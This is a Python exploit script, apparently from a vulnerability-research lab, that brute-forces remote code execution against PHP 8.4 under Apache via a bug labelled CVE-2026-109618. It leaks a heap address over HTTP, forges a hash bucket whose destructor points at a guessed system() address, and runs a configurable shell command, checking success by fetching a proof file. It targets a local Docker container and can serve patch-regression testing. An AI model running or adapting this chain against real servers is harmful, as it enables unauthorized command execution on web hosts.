#!/usr/bin/env python3
"""Phase B - remote, gdb-free RCE brute force (CVE-2026-109618, mod_php).

Chain per attempt (all over HTTP against a plain php:8.4.26-apache container,
no debugger, no fixture mapping):

    1. leak   POST /leak2/gassoc.php (stale-bucket leak, 16 MB body)
              -> L = *(u64*)(P+16), chunk_base = L & ~0x1FFFFF  (exact)
    2. forge  arData      = chunk_base + 0x32C0   (phase A: 4/4 exact)
              p0         = 0x28                  (phase A: 4/4 constant)
              pDestructor= chunk_base + S, S = 0x3900000 + k*0x10000 + 0x492C0
              (system: prefork D=libc-chunk grid - 10 fresh containers, all
               D mod 0x10000 == 0, range 0x1B0000 -> 28+ slots; within one
               target D is CONSTANT because children fork the parent's
               mappings, so k is enumerated in-place, one request per
               candidate; off_system = 0x492C0 from the image's glibc 2.36
               symtab, i.e. version-fingerprint knowledge)
    3. prove  command `id>/var/www/html/u.txt` (22 B, fits the 24-byte fake
              bucket); proof fetched over HTTP.

Connection handling: the OOM fatal response ALWAYS carries "Connection:
close" (verified), so leak and exploit cannot share one keep-alive
connection.  The lab container pins mpm_prefork to ONE child
(config/mpm-single.conf) so both connections are served by the same worker
process; worker-identity pinning in a multi-worker deployment is orthogonal
engineering (kernel accept semantics / connection occupancy) and is
documented as a lab simplification.

A wrong system guess calls garbage -> SIGSEGV -> apache respawns the child;
the next attempt re-leaks.  arData/chunk-relative S stay valid across
workers: ASLR only moves chunk_base, which is re-measured every attempt.

Usage:
    python3 tests/rce_bruteforce.py --port 28091            # k = 0..30
    python3 tests/rce_bruteforce.py --k-lo 10 --k-hi 20     # partial sweep
"""
import argparse
import http.client as httpclient
import json
import os
import re
import subprocess
import sys
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "tests"))

import cve_2026_109618_hash_oom as H  # noqa: E402
import gassoc_leak as G  # noqa: E402
import selfref_rce as S  # noqa: E402

CONTAINER = "rce-a"
PORT = 28091
IMAGE = "php:8.4.26-apache"
PLATFORM = ""                 # e.g. "linux/amd64" (Rosetta); "" = native

CHUNK_MASK = ~0x1FFFFF
ARDATA_OFF = 0x32C0            # arData - chunk_base (phase A, 4/4 exact)
P0 = 0x28                      # payload_base - arData (phase A, 4/4 const)
S_GRID_BASE = 0x3900000        # min observed D=libc-chunk (prefork sweep,
                               # tests/sweep_prefork_grid.py: 10 runs,
                               # D mod 0x10000 == 0, range 0x1B0000)
S_GRID_SLOTS = 32              # 28 observed slots + margin
OFF_SYSTEM = 0x492C0           # glibc 2.36 aarch64 system symbol offset
CMD = "id>/var/www/html/u.txt"  # 22 bytes, limit 23
PROOF = "u.txt"

LEAK_Q = "k=255&n=300&keylen=23&pad=0&padpos=before&v=2&hb=60000000"
LEAK_BODY = G.build_body(255, 16, "A", subs=120)


def sh(cmd, timeout=60):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=timeout)


def start_container(port, multi_worker=False):
    logdir = os.path.join(ROOT, "evidence", "logs", CONTAINER, "apache")
    os.makedirs(logdir, exist_ok=True)
    sh("docker rm -f %s >/dev/null 2>&1" % CONTAINER)
    mpm = ("-v %s/config/mpm-single.conf:/etc/apache2/conf-enabled/"
           "zz-mpm.conf:ro " % ROOT) if not multi_worker else ""
    plat = ("--platform %s " % PLATFORM) if PLATFORM else ""
    r = sh(
        "docker run -d --name %s -p 127.0.0.1:%d:80 "
        "%s"
        "-m 1g --cpus=2 --pids-limit=256 "
        "-v %s/webroot:/var/www/html "
        "-v %s/config/apache-vhost.conf:/etc/apache2/sites-enabled/"
        "000-default.conf:ro "
        "%s"
        "-v %s/config/php-lab.ini:/usr/local/etc/php/conf.d/zz-lab.ini:ro "
        "-v %s:/var/log/apache2 "
        "%s" % (CONTAINER, port, plat, ROOT, ROOT, mpm, ROOT, logdir, IMAGE))
    if not r.stdout.strip():
        raise SystemExit("docker run failed: %s" % r.stderr.strip())
    deadline = time.time() + 60
    while time.time() < deadline:
        rr = sh("docker exec %s chmod 777 /var/www/html 2>/dev/null" % CONTAINER)
        if rr.returncode == 0:
            break
        time.sleep(0.5)
    if not S.wait_port(port, timeout=60):
        raise SystemExit("apache never came up")


def http(port, method, path, body=None, ctype=None, timeout=150):
    """One request on a fresh connection.  Returns (status, body) or None."""
    try:
        c = httpclient.HTTPConnection("127.0.0.1", port, timeout=timeout)
        hdrs = {}
        if body is not None:
            hdrs["Content-Length"] = str(len(body))
        if ctype:
            hdrs["Content-Type"] = ctype
        c.request(method, path, body=body, headers=hdrs)
        r = c.getresponse()
        data = r.read()
        c.close()
        return r.status, data
    except OSError as e:
        return None, ("%s: %s" % (type(e).__name__, e)).encode()


def read_leak():
    log = sh("docker exec %s cat /tmp/g.log 2>/dev/null" % CONTAINER).stdout
    m = re.search(r"STALE i=255 len=(\d+) hex=([0-9a-f]+)", log)
    if not m:
        return None
    return int(m.group(1))


def worker_count():
    r = sh("docker exec %s sh -c 'pgrep -c apache2 || true'" % CONTAINER)
    return r.stdout.strip()


def attempt(port, s_cand, cmd):
    """One candidate.  Returns (hit, info)."""
    info = {"S": s_cand}

    # -- stage 1: warmup + leak (server closes the connection afterwards)
    sh("docker exec %s rm -f /tmp/g.log" % CONTAINER)
    st, _ = http(port, "GET", "/index.php", timeout=30)
    st, _ = http(port, "POST", "/leak2/gassoc.php?" + LEAK_Q, body=LEAK_BODY,
                 ctype="text/plain")
    info["leak_resp"] = st
    L = read_leak()
    if not L:
        info["error"] = "no leak"
        return False, info
    info["L"] = hex(L)
    chunk = L & CHUNK_MASK
    ar_data = chunk + ARDATA_OFF
    system_addr = chunk + s_cand
    info.update(chunk=hex(chunk), arData=hex(ar_data),
                system=hex(system_addr))

    # -- stage 2: exploit on a fresh connection (same single worker)
    sh("docker exec %s rm -f /var/www/html/%s" % (CONTAINER, PROOF))
    pat = S.exploit_pattern(ar_data, P0, system_addr, cmd)
    body = H.build_body(288, 0x41, int(3.2 * 1024 * 1024), pattern=pat)
    st2, data2 = http(port, "POST", "/urlenc/hit.php", body=body,
                      ctype="application/x-www-form-urlencoded")
    info["resp"] = st2
    time.sleep(0.6)

    # -- stage 3: proof over HTTP (worker may have died after the call)
    hit, proof = False, b""
    for _ in range(3):
        st3, data3 = http(port, "GET", "/" + PROOF, timeout=15)
        if st3 == 200 and b"uid=" in data3:
            hit, proof = True, data3
            break
        time.sleep(0.6)
    info["proof"] = proof[:120].decode("utf-8", "replace")
    info["hit"] = hit
    return hit, info


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--k-lo", type=int, default=0)
    ap.add_argument("--k-hi", type=int, default=S_GRID_SLOTS - 1)
    ap.add_argument("--cmd", default=CMD)
    ap.add_argument("--out", default=os.path.join(
        ROOT, "evidence", "runs", "rce-remote", "rce-bruteforce.json"))
    ap.add_argument("--no-restart", action="store_true",
                    help="reuse the running container (same D=libc-chunk)")
    ap.add_argument("--image", default=IMAGE,
                    help="e.g. php:8.4.27-apache for patch regression")
    ap.add_argument("--container", default=CONTAINER)
    ap.add_argument("--max-attempts", type=int, default=0,
                    help="0 = sweep k-lo..k-hi once")
    ap.add_argument("--multi-worker", action="store_true",
                    help="omit the mpm-single pin (default prefork pool); "
                         "leak and exploit then land on random workers")
    ap.add_argument("--platform", default=PLATFORM,
                    help="docker --platform for the target container")
    ap.add_argument("--profile", default=None,
                    help="profile JSON from tests/fingerprint.py; overrides "
                         "OFF_SYSTEM / grid / ARDATA_OFF / P0")
    args = ap.parse_args()
    globals()["CMD"] = args.cmd
    globals()["IMAGE"] = args.image
    globals()["CONTAINER"] = args.container
    globals()["PLATFORM"] = args.platform
    if args.profile:
        with open(args.profile) as fh:
            p = json.load(fh)
        globals()["OFF_SYSTEM"] = p["off_system"]
        globals()["S_GRID_BASE"] = p["grid"]["base"]
        globals()["S_GRID_SLOTS"] = p["grid"]["slots"]
        globals()["ARDATA_OFF"] = int(p.get("ardata_off", "0x32c0"), 16)
        globals()["P0"] = int(p.get("p0", "0x28"), 16)
        print("profile: off_system=0x%x grid_base=0x%x slots=%d "
              "ardata=0x%x p0=0x%x (%s/%s)"
              % (OFF_SYSTEM, S_GRID_BASE, S_GRID_SLOTS, ARDATA_OFF, P0,
                 p["arch"], p["platform"]), flush=True)
    os.makedirs(os.path.dirname(args.out), exist_ok=True)

    if args.no_restart:
        alive = "running" in sh("docker inspect -f {{.State.Status}} "
                                "%s" % CONTAINER).stdout
        if not alive:
            raise SystemExit("--no-restart: container %s not running"
                             % CONTAINER)
    else:
        start_container(args.port, multi_worker=args.multi_worker)
    print("workers after start: %s" % worker_count(), flush=True)

    attempts = []
    hit = False
    klo, khi = args.k_lo, args.k_hi
    while True:
        for k in range(klo, khi + 1):
            s_cand = S_GRID_BASE + OFF_SYSTEM + k * 0x10000
            t0 = time.time()
            try:
                hit, info = attempt(args.port, s_cand, args.cmd)
            except Exception as e:  # noqa: BLE001
                hit = False
                info = {"error": "%s: %s" % (type(e).__name__, e)}
            info["k"] = k
            info["secs"] = round(time.time() - t0, 1)
            attempts.append(info)
            print("attempt %2d S=0x%08x -> %s  (%.1fs)"
                  % (k, s_cand, "HIT" if hit else "miss", info["secs"]),
                  flush=True)
            if hit:
                break
        if hit or args.max_attempts <= 0 or len(attempts) >= args.max_attempts:
            break
        klo, khi = args.k_lo, args.k_hi  # re-sweep from the top

    alive = "running" in sh("docker inspect -f {{.State.Status}} "
                            "%s" % CONTAINER).stdout
    result = {
        "container": CONTAINER, "image": IMAGE, "cmd": args.cmd,
        "attempts": attempts, "hit": hit, "attempts_used": len(attempts),
        "container_alive": alive,
        "params": {"ARDATA_OFF": hex(ARDATA_OFF), "P0": hex(P0),
                   "S_GRID_BASE": hex(S_GRID_BASE),
                   "OFF_SYSTEM": hex(OFF_SYSTEM),
                   "platform": PLATFORM or "native",
                   "profile": args.profile,
                   "mpm": "default prefork pool" if args.multi_worker
                          else "single-worker lab pin "
                               "(config/mpm-single.conf)"},
    }
    with open(args.out, "w") as fh:
        json.dump(result, fh, indent=2)
    print("\n%s  attempts=%d  saved: %s"
          % ("RCE CONFIRMED" if hit else "NO HIT", len(attempts), args.out))


if __name__ == "__main__":
    main()
